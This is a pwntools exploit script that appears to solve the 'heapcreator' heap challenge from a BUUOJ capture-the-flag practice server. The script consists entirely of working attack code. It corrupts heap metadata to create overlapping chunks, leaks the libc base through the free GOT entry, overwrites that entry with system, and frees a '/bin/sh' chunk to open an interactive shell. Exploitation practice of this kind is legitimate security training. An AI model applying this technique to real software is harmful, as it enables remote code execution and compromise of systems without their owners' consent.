import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./heapcreator')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./heapcreator')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',28767)
			elf=ELF('./heapcreator')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

		def add(a,c):
			io.sendlineafter('Your choice :','1')
			io.sendlineafter('Size of Heap : ',str(a))
			io.sendafter('Content of heap:',c)

		def delete(a):
			io.sendlineafter('Your choice :','4')
			io.sendlineafter('Index :',str(a))

		def edit(a,c):
			io.sendlineafter('Your choice :','2')
			io.sendlineafter('Index :',str(a))
			io.sendafter('Content of heap : ',c)

		def show(a):
			io.sendlineafter('Your choice :','3')
			io.sendlineafter('Index :',str(a))
		
		add(0x28,'aaaa')
		add(0x88,'aaaa')
		add(0x68,'aaaa')
		add(0x78,'aaaa')
		delete(0)
		add(0xf8,'aaaa')
		add(0x18,'/bin/sh\x00')
		edit(3,'\x00'*0x70+p64(0x1c0)+'\x00')
		delete(1)
		delete(0)
		add(0xa8,'\x00'*0x88+p64(0x20)+p64(0x8)+p64(elf.got['free']))
		show(2)
		libc_base=u64(io.recvuntil('\nDone',drop=True)[-6:]+'\x00\x00')-libc.sym['free']
		libc.address=libc_base
		edit(2,p64(libc.sym['system']))
		delete(4)



		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue